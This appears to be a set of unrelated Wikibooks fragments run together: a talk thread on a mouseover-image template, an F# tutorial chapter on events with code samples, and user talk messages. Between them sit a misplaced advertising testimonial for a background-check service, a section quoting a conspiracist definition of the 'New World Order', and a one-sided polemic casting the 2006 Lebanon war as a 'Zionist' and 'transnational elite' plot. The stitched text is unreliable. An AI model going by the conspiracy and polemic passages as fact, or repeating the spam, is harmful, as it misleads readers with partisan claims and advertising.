# Is this a sensible general idea, or does it conflict with ideas of what a wikibook should do?
# Is my implementation reasonable? I've allowed the image captions to change on mouseover too, but this becomes a bit hacky (e.g. the mouseover caption is assumed to be longer than the normal text).
# '''If it is considered useful, can the appropriate css line (it is very simple) be placed in the system-wide ''common.css'' file'''
Here's the example, with not terribly relevant test images. It obviously won't work until you add the above line to [[Special:Mypage/monobook.css]]. 
&lt;div class=&quot;hoverContainer&quot; style=&quot;position: relative&quot;&gt;[[Image:Nymphaea tetragona.jpg|none|thumb|200px|Now it is a waterlily, blah blah blah blah blah blah blah blah blah blah blah blah blah]]
&lt;div  class=&quot;hideOnHover&quot; style=&quot;position: absolute; left: 0; top: 0; bottom:0; background-color: white;&quot;&gt;&lt;div&gt;[[Image:Gerbera_pink.jpg|none|thumb|200px|Pink Gerbera: picture should change when you place your mouse over it]]&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
Generated by the following wiki code
&lt;pre&gt;&lt;div class=&quot;hoverContainer&quot; style=&quot;position: relative&quot;&gt;[[Image:Nymphaea tetragona.jpg|none|thumb|200px|Now it is a waterlily, blah blah blah blah blah blah blah blah blah blah blah blah blah]]

:: Thanks a lot. I've now made a template to take advantage of this: [[Template:HoverImage]]. It's not been very well documented, but it seems to work. I've tried to allow standard image syntax (i.e. unnamed parameters in any order). It seems to me to be a bit of a hack, but it works. If you have any better suggestions, do change the template code.
:: -- [[User:HYanWong|HYanWong]] ([[User talk:HYanWong|talk]]) 22:51, 25 February 2009 (UTC)

Hi HYanWong, I just tried your template - it is great! I notice also that since it ''returns an image coding'' it can replace image coding within other templates that require it.   For example, to use your template ''within'' Noframeleft, (to make ''frameless'' images ''with'' a caption):

&lt;poem&gt;
&lt;nowiki&gt;{{noframeleft|{{HoverImage|Clematis Josephine1.jpg|Clematis hybrid3 ies.jpg|2500x150px}}|'''Figure 1''': ''Hover the image''}}&lt;/nowiki&gt;
&lt;/poem&gt;
{{noframeleft|{{HoverImage|Clematis Josephine1.jpg|Clematis hybrid3 ies.jpg|2500x150px}}|'''Figure 1''': ''Hover the image''}}
It does the thing on the left: Or, in a drop-box, this:
{{dropimage|align=center|Press for Hover Example|{{noframecenter|{{HoverImage|Clematis Josephine1.jpg|Clematis hybrid3 ies.jpg|2500x150px}}|'''Figure 1''': ''Hover the image''}} }}
&lt;br clear=right&gt;
I must admit however that the coding of your template is for the time being beyond me. Regards, [[User:Armchair|Armchair]] ([[User talk:Armchair|talk]]) 21:17, 28 February 2009 (UTC)

: With the good old &quot;print version&quot; approach it's no problem to use &lt;nowiki&gt;&lt;includeonly&gt; and &lt;noinclude&gt;&lt;/nowiki&gt; to have a screen version and a different print version. You would use the hover image only in the screen version (inside &lt;nowiki&gt;&lt;noinclude&gt;&lt;/nowiki&gt; and &lt;nowiki&gt;&lt;/noinclude&gt;&lt;/nowiki&gt;) and maybe an array of images in the print version (inside &lt;nowiki&gt;&lt;includeonly&gt;&lt;/nowiki&gt; and &lt;nowiki&gt;&lt;/includeonly&gt;&lt;/nowiki&gt;). With the printing of collections, I guess you have to define a template called PrintHoverImage to provide an alternative for printing.

Our of course took advantage of the great offer for the background check service, and want to thank US Search for it. My entire experience, from my first people search inquiry, has been a pleasure, and in these impersonal times that's saying a lot!

==Fusion of Conspiracies==
In international relations theory, the term &quot;new world order&quot; refers to a new period of history evidencing a dramatic change in world political thought and the balance of power. However, in conspiracy theory, the term &quot;New World Order&quot; (the capital letters are distinguishing) refers to the advent of a cryptocratic or totalitarian world government.

At the core of most theories, a powerful and secretive group of globalists is conspiring to eventually rule the world through an autonomous world government, which would replace sovereign states and other checks and balances in international power struggles. Significant occurrences in politics and business are speculated to be caused by an extremely influential cabal operating through many front organizations. Numerous historical and current events are seen as steps in an on-going plot to achieve world domination primarily through secret political gatherings and decision-making processes.

In the past, the conspirators were usually said to be crypto-communist sympathizers who were intent upon bringing the United States under a common world government with the Soviet Union, but the dissolution of the USSR in 1991 undercut that theory. So most conspiracy theorists changed their focus to the United Nations as the likely controlling force in a bureaucratic collectivist New World Order, an idea which is undermined by the powerlessness of the U.N. and the unwillingness of even moderates within the American Establishment to give it anything but a limited role.
==Defined==
According to ThreeWorldWars, &quot;The term New World Order (NWO) has been used by numerous politicians through the ages, and is a generic term used to refer to a worldwide conspiracy being orchestrated by an extremely powerful and influential group of genetically-related individuals (at least at the highest echelons) which include many of the world's wealthiest people, top political leaders, and corporate elite, as well as members of the so-called Black Nobility of Europe (dominated by the British Crown) whose goal is to create a One World (fascist) Government, stripped of nationalistic and regional boundaries, that is obedient to their agenda.&quot;
==Lebanon==
The ‘cessation of hostilities’ in Lebanon, (i.e. of the Zionist attack against its people), under humiliating conditions for the Zionist army ―which used to enjoy in the past successive victories leading to a continuous expansion of  Israel― was a surprise to some,  whereas to others it was utterly expected. It was not, anyway, the first time that this has happened. As recently as  1996, Hezbollah was sending again Katyusha rockets into northern Israel and Shimon Peres of the ‘progressive’ Labour Party was also following the same scorched-earth policy as Olmert, with the aim of driving out the local population through mass bombing of the infrastructure and allowing the Zionist army to crush Hezbollah. Although Peres managed at the time to drive 400,000 people from their homes, creating in the process similar hecatombs as today including the murder of 102 civilians taking refuge in the village of Qana (yet again!), the operation failed to dismantle Hezbollah. Despite this dismal failure, Zionists attempted to occupy South Lebanon, until they realised by 2000 that such an occupation was unsustainable. It now seems, however, that they have learned a lesson from previous failures: if evicting Hezbollah from Southern Lebanon, through the use of Israeli military power, was impossible and a permanent occupation of it was non feasible, attempting to de-activate it through the use of the Lebanese army and the ‘peace-keeping’ force of the ‘international community’ (read: the transnational elite and those dependent on it) might be worth trying.
===Against Zionist Campaign===
Although therefore, the military outcome of the new Zionist campaign was for several military analysts well anticipated, it is now clear that the pre-planned attack of Israel with the collusion of the military leadership of the transnational elite did not aim at a military victory as such ―without of course expecting the sort of damage they suffered in the hands of Hezbollah!— but, mainly, to a diplomatic victory. This sort of victory was almost guaranteed by the predominance in the UN of the transnational elite (USA and EU) and its allies in the Russian and Chinese elites, the former being keen to secure entry into the World Trade Organisation (the Bush Administration aptly postponed a decision on this last month, presumably, in order to blackmail the Russian elite to support it in Lebanon and Iran) and the latter having to protect its economic ‘miracle’, which crucially depends on foreign investment and exports to the members of the transnational elite. In other words, it seems that their plan has always been to de-activate Hezbollah, through the establishment of an extended ‘safety zone’ between the Israel-Lebanon borders and the Litani River, which will be “an area free of any armed personnel, assets and weapons other than those of the government of Lebanon and of UNIFIL”, as prescribed by Resolution 1701 passed unanimously by the transnational elite and its allies. Their hope is that this ‘peace-keeping’ force, consisting of contingents from the armies of several members of the transnational elite and its allies, will achieve what Zionists could not achieve in the previous quarter of a century or so! Furthermore, given that the core of this force will be the politically divided Lebanese army (which did not manage to fire a shot while the country, it was supposed to protect, was being smashed into pieces!), this development is highly likely to lead to a new civil conflict inside Lebanon, further undermining the resistance against the transnational elite and the Zionists in the Middle East.

{{fsharpTitle|Events}}

'''Events''' allow objects to communicate with one another through a kind of synchronous message passing. Events are simply hooks to other functions: objects register callback functions to an event, and these callbacks will be executed when (and if) the event is triggered by some object.

For example, let's say we have a clickable button which exposed an event called &lt;code&gt;Click&lt;/code&gt;. We can register a block of code, something like &lt;code&gt;fun () -&gt; printfn &quot;I've been clicked!&quot;&lt;/code&gt;, to the button's click event. When the click event is triggered, it will execute the block of code we've registered. If we wanted to, we could register an indefinite number of callback functions to the click event -- the button doesn't care what code is trigged by the callbacks or how many callback functions are registered to its click event, it blindly executes whatever functions are hooked to its click event.

Event-driven programming is natural in GUI code, as GUIs tend to consist of controls which react and respond to user input. Events are, of course, useful in non-GUI applications as well. For example, if we have an object with mutable properties, we may want to notify another object when those properties change.

== Defining Events ==
Events are created and used though F#'s [http://msdn.microsoft.com/en-us/library/ee370608(VS.100).aspx Event class]. To create an event, use the &lt;code&gt;Event&lt;/code&gt; constructor as follows:

&lt;source lang=&quot;ocaml&quot;&gt;
type Person(name : string) =
    let mutable _name = name;
    let nameChanged = new Event&lt;string&gt;()
    
    member this.Name
        with get() = _name
        and set(value) = _name &lt;- value
&lt;/source&gt;


To allow listeners to hook onto our event, we need to expose the &lt;code&gt;nameChanged&lt;/code&gt; field as a public member using the event's &lt;code&gt;Publish&lt;/code&gt; property:

&lt;source lang=&quot;ocaml&quot;&gt;
type Person(name : string) =
    let mutable _name = name;
    let nameChanged = new Event&lt;unit&gt;() (* creates event *)
    
    member this.NameChanged = nameChanged.Publish (* exposed event handler *)
    
    member this.Name
        with get() = _name
        and set(value) =
            _name &lt;- value
            nameChanged.Trigger() (* invokes event handler *)
&lt;/source&gt;

Now, any object can listen to the changes on the person method. By convention and [http://msdn.microsoft.com/en-us/library/ms229012.aspx Microsoft's recommendation], events are usually named &lt;code&gt;''Verb''&lt;/code&gt; or &lt;code&gt;''VerbPhrase''&lt;/code&gt;, as well as adding tenses like &lt;code&gt;''Verbed''&lt;/code&gt; and &lt;code&gt;''Verbing''&lt;/code&gt; to indicate pre- and post-events.

== Adding Callbacks to Event Handlers ==
Its very easy to add callbacks to event handlers. Each event handler has the type &lt;code&gt;IEvent&lt;'T&gt;&lt;/code&gt; which exposes several methods:

'''&lt;code&gt;val Add : event:('T -&gt; unit) -&gt; unit&lt;/code&gt;'''
: Connect a listener function to the event. The listener will be invoked when the event is fired. 
'''&lt;code&gt;val AddHandler : 'del -&gt; unit&lt;/code&gt;'''
: Connect a handler delegate object to the event. A handler can be later removed using RemoveHandler. The listener will be invoked when the event is fired. 
'''&lt;code&gt;val RemoveHandler : 'del -&gt; unit&lt;/code&gt;'''
: Remove a listener delegate from an event listener store.

Here's an example program:

&lt;source lang=&quot;ocaml&quot;&gt;
type Person(name : string) =
    let mutable _name = name;
    let nameChanged = new Event&lt;unit&gt;() (* creates event *)
    
    member this.NameChanged = nameChanged.Publish (* exposed event handler *)
    
    member this.Name
        with get() = _name
        and set(value) =
            _name &lt;- value
            nameChanged.Trigger() (* invokes event handler *)
            
let p = new Person(&quot;Bob&quot;)
p.NameChanged.Add(fun () -&gt; printfn &quot;-- Name changed! New name: %s&quot; p.Name)

printfn &quot;Event handling is easy&quot;
p.Name &lt;- &quot;Joe&quot;

printfn &quot;It handily decouples objects from one another&quot;
p.Name &lt;- &quot;Moe&quot;

p.NameChanged.Add(fun () -&gt; printfn &quot;-- Another handler attached to NameChanged!&quot;)

printfn &quot;It's also causes programs behave non-deterministically.&quot;
p.Name &lt;- &quot;Bo&quot;

printfn &quot;The function NameChanged is invoked effortlessly.&quot;
&lt;/source&gt;

This program outputs the following:

&lt;pre&gt;Event handling is easy
-- Name changed! New name: Joe
It handily decouples objects from one another
-- Name changed! New name: Moe
It's also causes programs behave non-deterministically.
-- Name changed! New name: Bo
-- Another handler attached to NameChanged!
The function NameChanged is invoked effortlessly.&lt;/pre&gt;

: '''Note:''' When multiple callbacks are connected to a single event, they are executed in the order they are added. However, in practice, you should '''not''' write code with the expectation that events will trigger in a particular order, as doing so can introduce complex dependencies between functions. Event-driven programming is often non-deterministic and fundamentally stateful, which can occasionally be at odds with the spirit of functional programming. Its best to write callback functions which do not modify state, and do not depend on the invocation of any prior events.

== Working with EventHandlers Explicitly ==
=== Adding and Removing Event Handlers ===
The code above demonstrates how to use the &lt;code&gt;IEvent&lt;'T&gt;.add&lt;/code&gt; method. However, occasionally we need to remove callbacks. To do so, we need to work with the &lt;code&gt;IEvent&lt;'T&gt;.AddHandler&lt;/code&gt; and &lt;code&gt;IEvent&lt;'T&gt;.RemoveHandler&lt;/code&gt; methods, as well as .NET's built-in [http://msdn.microsoft.com/en-us/library/system.delegate.aspx System.Delegate] type.

The function &lt;code&gt;person.NameChanged.AddHandler&lt;/code&gt; has the type &lt;code&gt;val AddHandler : Handler&lt;'T&gt; -&gt; unit&lt;/code&gt;, where &lt;code&gt;Handler&lt;'T&gt;&lt;/code&gt; inherits from &lt;code&gt;System.Delegate&lt;/code&gt;. We can create an instance of &lt;code&gt;Handler&lt;/code&gt; as follows:

&lt;source lang=&quot;ocaml&quot;&gt;
type Person(name : string) =
    let mutable _name = name;
    let nameChanged = new Event&lt;unit&gt;() (* creates event *)
    
    member this.NameChanged = nameChanged.Publish (* exposed event handler *)
    
    member this.Name
        with get() = _name
        and set(value) =
            _name &lt;- value
            nameChanged.Trigger() (* invokes event handler *)

            
let p = new Person(&quot;Bob&quot;)

let person_NameChanged =
    new Handler&lt;unit&gt;(fun sender eventargs -&gt; printfn &quot;-- Name changed! New name: %s&quot; p.Name)

p.NameChanged.AddHandler(person_NameChanged)

printfn &quot;Event handling is easy&quot;
p.Name &lt;- &quot;Joe&quot;

printfn &quot;It handily decouples objects from one another&quot;
p.Name &lt;- &quot;Moe&quot;

p.NameChanged.RemoveHandler(person_NameChanged)
p.NameChanged.Add(fun () -&gt; printfn &quot;-- Another handler attached to NameChanged!&quot;)

printfn &quot;It's also causes programs behave non-deterministically.&quot;
p.Name &lt;- &quot;Bo&quot;

printfn &quot;The function NameChanged is invoked effortlessly.&quot;&lt;/source&gt;

This program outputs the following:

&lt;pre&gt;Event handling is easy
-- Name changed! New name: Joe
It handily decouples objects from one another
-- Name changed! New name: Moe
It's also causes programs behave non-deterministically.
-- Another handler attached to NameChanged!
The function NameChanged is invoked effortlessly.&lt;/pre&gt;

=== Defining New Delegate Types ===
F#'s event handling model is a little different from the rest of .NET. If we want to expose F# events to different languages like C# or VB.NET, we can define a custom delegate type which compiles to a .NET delegate using the &lt;code&gt;delegate&lt;/code&gt; keyword, for example:

&lt;source lang=&quot;ocaml&quot;&gt;
type NameChangingEventArgs(oldName : string, newName : string) =
    inherit System.EventArgs()

    member this.OldName = oldName
    member this.NewName = newName
        
type NameChangingDelegate = delegate of obj * NameChangingEventArgs -&gt; unit&lt;/source&gt;

The convention &lt;code&gt;obj * NameChangingEventArgs&lt;/code&gt; corresponds to the .NET naming guidelines which recommend that all events have the type &lt;code&gt;val eventName : (sender : obj * e : #EventArgs) -&gt; unit&lt;/code&gt;.

=== Use existing .NET WPF Event and Delegate Types ===
Try using existing .NET WPF Event and Delegate, example, ClickEvent and RoutedEventHandler.
Create F# Windows Application .NET project with referring these libraries (PresentationCore PresentationFramework System.Xaml WindowsBase).  The program will display a button in a window.  Clicking the button will display the button's content as string.

&lt;source lang=&quot;FSharp&quot;&gt;
open System.Windows
open System.Windows.Controls
open System.Windows.Input 
open System
[&lt;EntryPoint&gt;] [&lt;STAThread&gt;]              // STAThread is Single-Threading-Apartment which is required by WPF
let main argv = 
    let b = new Button(Content=&quot;Button&quot;)  // b is a Button with &quot;Button&quot; as content
    let f(sender:obj)(e:RoutedEventArgs) = // (#3) f is a fun going to handle the Button.ClickEvent
                                           //   f signature must be curried, not tuple as govened by Delegate-RoutedEventHandler.
                                           //   that means f(sender:obj,e:RoutedEventArgs) will not work.
        let b = sender:?&gt;Button            // sender will have Button-type.  Convert it to Button into b.
        MessageBox.Show(b.Content:?&gt;string) // Retrieve the content of b which is obj.  
                                            //    Convert it to string and display by &lt;code&gt;Messagebox.Show&lt;/code&gt;
            |&gt; ignore                       // ignore the return because f-signature requires: obj-&gt;RoutedEventArgs-&gt;unit
                                                      
                                                      
    let d = new RoutedEventHandler(f)       // (#2) d will have type-RoutedEventHandler, 
                                            //      RoutedEventHandler is a kind of delegate to handle Button.ClickEvent.  
                                            //      The f must have signature governed by RoutedEventHandler.
    b.AddHandler(Button.ClickEvent,d)       // (#1) attach a RountedEventHandler-d for Button.ClickEvent
    let w = new Window(Visibility=Visibility.Visible,Content=b)  // create a window-w have a Button-b 
                                                                 // which will show the content of b when clicked
    (new Application()).Run(w)      // create new Application() running the Window-w.
&lt;/source&gt;
&lt;li&gt;(#1) To attach a handler to a control for an event: &lt;code&gt;b.AddHandler(Button.ClickEvent,d)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;(#2) Create a delegate/handler using a function: &lt;code&gt;let d = new RoutedEventHandler(f)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;(#3) Create a function with specific signature defined by the delegate: &lt;code&gt;let f(sender:obj)(e:RoutedEventArgs) = ....&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;b is the control.&lt;/li&gt;
&lt;li&gt;AddHandler is attach.&lt;/li&gt;
&lt;li&gt;Button.ClickEvent is the event.&lt;/li&gt;
&lt;li&gt;d is delegate/handler.  It is a layer to make sure the signature is correct&lt;/li&gt;
&lt;li&gt;f is the real function/program provided to the delegate.&lt;/li&gt;
&lt;li&gt;Rule#1: b must have this event Button.ClickEvent:  b is type-Button-object.  ClickEvent is a static property of type-ButtonBase which is inherited by type-Button.  So Button-type will also have this static property ClickEvent.  
&lt;li&gt;Rule#2: d must be the handler of ClickEvent:  ClickEvent is type-RoutedEvent.  RoutedEvent's handler is RoutedEventHandler, just adding Handler at end.  RoutedEventHandler is a defined delegate in .NET library.  To create d, just let d = new RoutedEventHandler(f), where f is function.&lt;/li&gt;
&lt;li&gt;Rule#3: f must have signature obeying delegate-d's definition: Check .NET library, RoutedEventHandler is a delegate of C#-signature: &lt;code&gt;void RoutedEventHandler(object sender, RoutedEventArgs e)&lt;/code&gt;.  So f must have same signature.  Present the signature in F# is &lt;code&gt;(obj * RountedEventHandler) -&gt; unit&lt;/code&gt;&lt;/li&gt;

== Passing State To Callbacks ==
Events can pass state to callbacks with minimal effort. Here is a simple program which reads a file in blocks of characters:

&lt;source lang=&quot;ocaml&quot;&gt;
open System

type SuperFileReader() =
    let progressChanged = new Event&lt;int&gt;()
    
    member this.ProgressChanged = progressChanged.Publish
    
    member this.OpenFile (filename : string, charsPerBlock) =
        use sr = new System.IO.StreamReader(filename)
        let streamLength = int64 sr.BaseStream.Length
        let sb = new System.Text.StringBuilder(int streamLength)
        let charBuffer = Array.zeroCreate&lt;char&gt; charsPerBlock
        
        let mutable oldProgress = 0
        let mutable totalCharsRead = 0
        progressChanged.Trigger(0)
        while not sr.EndOfStream do
            (* sr.ReadBlock returns number of characters read from stream *)
            let charsRead = sr.ReadBlock(charBuffer, 0, charBuffer.Length)
            totalCharsRead &lt;- totalCharsRead + charsRead
            
            (* appending chars read from buffer *)
            sb.Append(charBuffer, 0, charsRead) |&gt; ignore
            
            let newProgress = int(decimal totalCharsRead / decimal streamLength * 100m)
            if newProgress &gt; oldProgress then
                progressChanged.Trigger(newProgress) // passes newProgress as state to callbacks
                oldProgress &lt;- newProgress
            
        sb.ToString()
        
let fileReader = new SuperFileReader()
fileReader.ProgressChanged.Add(fun percent -&gt;
    printfn &quot;%i percent done...&quot; percent)
    
let x = fileReader.OpenFile(@&quot;C:\Test.txt&quot;, 50)
printfn &quot;%s[...]&quot; x.[0 .. if x.Length &lt;= 100 then x.Length - 1 else 100]&lt;/source&gt;

This program has the following types:

&lt;source lang=&quot;ocaml&quot;&gt;type SuperFileReader =
  class
    new : unit -&gt; SuperFileReader
    member OpenFile : filename:string * charsToRead:int -&gt; string
    member ProgressChanged : IEvent&lt;int&gt;
  end
val fileReader : SuperFileReader
val x : string&lt;/source&gt;

Since our event has the type &lt;code&gt;IEvent&lt;int&gt;&lt;/code&gt;, we can pass &lt;code&gt;int&lt;/code&gt; data as state to listening callbacks. This program outputs the following:

&lt;pre&gt;0 percent done...
4 percent done...
9 percent done...
14 percent done...
19 percent done...
24 percent done...
29 percent done...
34 percent done...
39 percent done...
44 percent done...
49 percent done...
53 percent done...
58 percent done...
63 percent done...
68 percent done...
73 percent done...
78 percent done...
83 percent done...
88 percent done...
93 percent done...
98 percent done...
100 percent done...
In computer programming, event-driven programming or event-based programming is a programming paradig[...]&lt;/pre&gt;

== Retrieving State from Callers ==
A common idiom in event-driven programming is pre- and post-event handling, as well as the ability to cancel events. Cancellation requires two-way communication between an event handler and a listener, which we can easily accomplish through the use of [[F Sharp Programming/Mutable Data#Ref cells|ref cells]] or mutable members:

&lt;source lang=&quot;ocaml&quot;&gt;
type Person(name : string) =
    let mutable _name = name;
    let nameChanging = new Event&lt;string * bool ref&gt;()
    let nameChanged = new Event&lt;unit&gt;()
    
    member this.NameChanging = nameChanging.Publish
    member this.NameChanged = nameChanged.Publish
    
    member this.Name
        with get() = _name
        and set(value) =
            let cancelChange = ref false
            nameChanging.Trigger(value, cancelChange)
            
            if not !cancelChange then
                _name &lt;- value
                nameChanged.Trigger()
                
let p = new Person(&quot;Bob&quot;)

p.NameChanging.Add(fun (name, cancel) -&gt;
    let exboyfriends = [&quot;Steve&quot;; &quot;Mike&quot;; &quot;Jon&quot;; &quot;Seth&quot;]
    if List.exists (fun forbiddenName -&gt; forbiddenName = name) exboyfriends then
        printfn &quot;-- No %s's allowed!&quot; name
        cancel := true
    else
        printfn &quot;-- Name allowed&quot;)
    
p.NameChanged.Add(fun () -&gt;
    printfn &quot;-- Name changed to %s&quot; p.Name)
    
let tryChangeName newName =
    printfn &quot;Attempting to change name to '%s'&quot; newName
    p.Name &lt;- newName

tryChangeName &quot;Joe&quot;
tryChangeName &quot;Moe&quot;
tryChangeName &quot;Jon&quot;
tryChangeName &quot;Thor&quot;
&lt;/source&gt;

This program has the following types:
&lt;source lang=&quot;ocaml&quot;&gt;type Person =
  class
    new : name:string -&gt; Person
    member Name : string
    member NameChanged : IEvent&lt;unit&gt;
    member NameChanging : IEvent&lt;string * bool ref&gt;
    member Name : string with set
  end
val p : Person
val tryChangeName : string -&gt; unit&lt;/source&gt;

This program outputs the following:
&lt;pre&gt;Attempting to change name to 'Joe'
-- Name allowed
-- Name changed to Joe
Attempting to change name to 'Moe'
-- Name allowed
-- Name changed to Moe
Attempting to change name to 'Jon'
-- No Jon's allowed!
Attempting to change name to 'Thor'
-- Name allowed
-- Name changed to Thor&lt;/pre&gt;

If we need to pass a significant amount of state to listeners, then its recommended to wrap the state in an object as follows:

&lt;source lang=&quot;ocaml&quot;&gt;
type NameChangingEventArgs(newName : string) =
    inherit System.EventArgs()
    
    let mutable cancel = false
    member this.NewName = newName
    member this.Cancel
        with get() = cancel
        and set(value) = cancel &lt;- value

type Person(name : string) =
    let mutable _name = name;
    let nameChanging = new Event&lt;NameChangingEventArgs&gt;()
    let nameChanged = new Event&lt;unit&gt;()
    
    member this.NameChanging = nameChanging.Publish
    member this.NameChanged = nameChanged.Publish
    
    member this.Name
        with get() = _name
        and set(value) =
            let eventArgs = new NameChangingEventArgs(value)
            nameChanging.Trigger(eventArgs)
            
            if not eventArgs.Cancel then
                _name &lt;- value
                nameChanged.Trigger()
                
let p = new Person(&quot;Bob&quot;)

p.NameChanging.Add(fun e -&gt;
    let exboyfriends = [&quot;Steve&quot;; &quot;Mike&quot;; &quot;Jon&quot;; &quot;Seth&quot;]
    if List.exists (fun forbiddenName -&gt; forbiddenName = e.NewName) exboyfriends then
        printfn &quot;-- No %s's allowed!&quot; e.NewName
        e.Cancel &lt;- true
    else
        printfn &quot;-- Name allowed&quot;)

(* ... rest of program ... *)
&lt;/source&gt;

By convention, custom event parameters should inherit from &lt;code&gt;[http://msdn.microsoft.com/en-us/library/system.eventargs.aspx System.EventArgs]&lt;/code&gt;, and should have the suffix &lt;code&gt;EventArgs&lt;/code&gt;.

== Using the Event Module ==
F# allows users to pass event handlers around as first-class values in fundamentally the same way as all other functions. The [http://research.microsoft.com/en-us/um/cambridge/projects/fsharp/manual/FSharp.Core/Microsoft.FSharp.Control.Event.html Event module] has a variety of functions for working with event handlers:

'''&lt;code&gt;val choose : ('T -&gt; 'U option) -&gt; IEvent&lt;'del,'T&gt; -&gt; IEvent&lt;'U&gt; (requires delegate and 'del :&gt; Delegate)&lt;/code&gt;'''
: Return a new event which fires on a selection of messages from the original event. The selection function takes an original message to an optional new message.   
'''&lt;code&gt;val filter : ('T -&gt; bool) -&gt; IEvent&lt;'del,'T&gt; -&gt; IEvent&lt;'T&gt; (requires delegate and 'del :&gt; Delegate)&lt;/code&gt;'''
: Return a new event that listens to the original event and triggers the resulting event only when the argument to the event passes the given function. 
'''&lt;code&gt;val listen : ('T -&gt; unit) -&gt; IEvent&lt;'del,'T&gt; -&gt; unit (requires delegate and 'del :&gt; Delegate)&lt;/code&gt;'''
: Run the given function each time the given event is triggered. 
'''&lt;code&gt;val map : ('T -&gt; 'U) -&gt; IEvent&lt;'del,'T&gt; -&gt; IEvent&lt;'U&gt; (requires delegate and 'del :&gt; Delegate)&lt;/code&gt;'''
: Return a new event which fires on a selection of messages from the original event. The selection function takes an original message to an optional new message. 
'''&lt;code&gt;val merge : IEvent&lt;'del1,'T&gt; -&gt; IEvent&lt;'del2,'T&gt; -&gt; IEvent&lt;'T&gt; (requires delegate and 'del1 :&gt; Delegate and delegate and 'del2 :&gt; Delegate)&lt;/code&gt;'''
: Fire the output event when either of the input events fire. 
'''&lt;code&gt;val pairwise : IEvent&lt;'del,'T&gt; -&gt; IEvent&lt;'T * 'T&gt; (requires delegate and 'del :&gt; Delegate)&lt;/code&gt;'''
: Return a new event that triggers on the second and subsequent triggerings of the input event. The Nth triggering of the input event passes the arguments from the N-1th and Nth triggering as a pair. The argument passed to the N-1th triggering is held in hidden internal state until the Nth triggering occurs. You should ensure that the contents of the values being sent down the event are not mutable. Note that many EventArgs types are mutable, e.g. MouseEventArgs, and each firing of an event using this argument type may reuse the same physical argument obejct with different values. In this case you should extract the necessary information from the argument before using this combinator. 
'''&lt;code&gt;val partition : ('T -&gt; bool) -&gt; IEvent&lt;'del,'T&gt; -&gt; IEvent&lt;'T&gt; * IEvent&lt;'T&gt; (requires delegate and 'del :&gt; Delegate&lt;/code&gt;'''
: Return a new event that listens to the original event and triggers the first resulting event if the application of the predicate to the event arguments returned true, and the second event if it returned false.
'''&lt;code&gt;val scan : ('U -&gt; 'T -&gt; 'U) -&gt; 'U -&gt; IEvent&lt;'del,'T&gt; -&gt; IEvent&lt;'U&gt; (requires delegate and 'del :&gt; Delegate)&lt;/code&gt;'''
: Return a new event consisting of the results of applying the given accumulating function to successive values triggered on the input event. An item of internal state records the current value of the state parameter. The internal state is not locked during the execution of the accumulation function, so care should be taken that the input IEvent not triggered by multiple threads simultaneously.
'''&lt;code&gt;val split : ('T -&gt; Choice&lt;'U1,'U2&gt;) -&gt; IEvent&lt;'del,'T&gt; -&gt; IEvent&lt;'U1&gt; * IEvent&lt;'U2&gt; (requires delegate and 'del :&gt; Delegate)&lt;/code&gt;'''
: Return a new event that listens to the original event and triggers the first resulting event if the application of the function to the event arguments returned a Choice2Of1, and the second event if it returns a Choice2Of2. 

Take the following snippet:
&lt;source lang=&quot;ocaml&quot;&gt;
p.NameChanging.Add(fun (e : NameChangingEventArgs) -&gt;
    let exboyfriends = [&quot;Steve&quot;; &quot;Mike&quot;; &quot;Jon&quot;; &quot;Seth&quot;]
    if List.exists (fun forbiddenName -&gt; forbiddenName = e.NewName) exboyfriends then
        printfn &quot;-- No %s's allowed!&quot; e.NewName
        e.Cancel &lt;- true)&lt;/source&gt;

We can rewrite this in a more functional style as follows:
&lt;source lang=&quot;ocaml&quot;&gt;
p.NameChanging
    |&gt; Event.filter (fun (e : NameChangingEventArgs) -&gt;  
        let exboyfriends = [&quot;Steve&quot;; &quot;Mike&quot;; &quot;Jon&quot;; &quot;Seth&quot;]
        List.exists (fun forbiddenName -&gt;forbiddenName = e.NewName) exboyfriends )
    |&gt; Event.listen (fun e -&gt;
        printfn &quot;-- No %s's allowed!&quot; e.NewName
        e.Cancel &lt;- true)
&lt;/source&gt;

== Hello! ==

Hello Swift, how are you doing? We haven't seen you in a little while, although the general activity level here has been down across the board, so we haven't seen a lot of people. 

Anyway, welcome back! Not much has changed in the last month, although if you have the time could you take a look at Mike.lifeguards nom at [[WB:RFP]]? We want to see lots of votes before we make the promotion. Let me know if you need anything. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 13:42, 10 June 2008 (UTC)

: Thanks WK,
: It has indeed been a while. I've been find, but too busy to really return. Saw a while back that the chemical synthesis book finally got deleted and got a bit miffed. Searching for some Japanese resources, I found myself back and seeing the [[Japanese]] wikibook in disarray, figured I'd try to help clean it up a bit.
: Any big changes since I was gone (wow, over a year, now), or have things just rolled along as normal through the slump?
: I'll have a look at [[WB:RFP]] and see if I feel up to the task of commenting on it. Not sure if I'm any use since it's been a while. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 13:57, 10 June 2008 (UTC)
::I wont deny my part in the Chemical Synthesis book's departure, although I won't rehash that here and now. Things have been rolling along pretty normal, although &quot;normal&quot; for us implies occasional changes. We're working, slowly, on removing the bookshelves in favor of [[WB:AS|subject pages]]. Subject pages are being based on DPL and dynamically-generated category lists to keep books organized. The [[Subject:Engineering|Engineering bookshelf]] has already been converted over to the new system, so that's a good example to look at if you want to know more about the project. We've also updated a lot of our templates to be better-looking and more descriptive.
:We've also been trying to select a new logo for the project at [[meta:Wikibooks/Logo]], although that discussion is becoming more and more of a disaster. One of the more popular entries was found to be a copyvio, so that's caused us some big problems. 
:A lot of people seem to have moved on in the past year, although a lot of familiar faces are still around too. It should be easy to get back into the groove of things, because nothing major has changed that would affect workflow. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 14:51, 10 June 2008 (UTC)

== Japanese Book ==

